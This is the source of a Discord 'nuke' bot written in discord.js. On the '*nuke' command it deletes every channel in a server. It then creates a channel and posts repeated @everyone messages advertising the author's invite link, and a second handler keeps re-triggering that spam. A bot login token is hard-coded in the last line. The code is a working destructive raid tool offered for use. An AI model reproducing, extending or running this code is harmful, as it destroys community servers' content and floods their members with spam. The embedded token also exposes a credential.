const { Client, Intents } = require('discord.js');
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });


// code by
//     ___               __     
//    /   | __  ____  __/ /_  __
//   / /| |/ / / / / / / / / / /
//  / ___ / /_/ / /_/ / / /_/ / 
// /_/  |_\__, /\__,_/_/\__, /  
//       /____/        /____/   


client.on('message', async (message) => {
  if (message.content === '*nuke') {
  message.guild.channels.cache.forEach
        (channel => channel.delete());

        await message.guild.channels.create
        ('Nuked By Ayuly#3851', {
            type : 'text'
        }).then(async channel=> {
        channel.send('@everyone Nuked by Ayuly#3851  https://discord.gg/F8eeqRh9aG')
        })
    }
})


client.on('message', async (message) => {
    if (message.content === '@everyone Nuked by Ayuly#3851  https://discord.gg/F8eeqRh9aG') {
        await message.guild.channels.create
        ('Nuked By Ayuly#3851', {
            type : 'text'
        }).then(async channel=> {
          channel.send('@everyone Nuked by Ayuly#3851  https://discord.gg/F8eeqRh9aG')
        message.channel.send('@everyone Nuked by Ayuly#3851  https://discord.gg/F8eeqRh9aG')
        message.channel.send('@everyone Nuked by Ayuly#3851  https://discord.gg/F8eeqRh9aG')
        message.channel.send('@everyone Nuked by Ayuly#3851  https://discord.gg/F8eeqRh9aG')
        message.channel.send('@everyone Nuked by Ayuly#3851  https://discord.gg/F8eeqRh9aG')
        message.channel.send('@everyone Nuked by Ayuly#3851  https://discord.gg/F8eeqRh9aG')
        message.channel.send('@everyone Nuked by Ayuly#3851  https://discord.gg/F8eeqRh9aG')
        message.channel.send('@everyone Nuked by Ayuly#3851  https://discord.gg/F8eeqRh9aG')
        message.channel.send('@everyone Nuked by Ayuly#3851  https://discord.gg/F8eeqRh9aG')
    })
}
})


client.login('OTgwMzQ4MjU2MTU4NjM0MDA1.G3cfau.NF8_rHiHYptoNEzOFnKX6tnokVyJ0Q_1tocIiE')
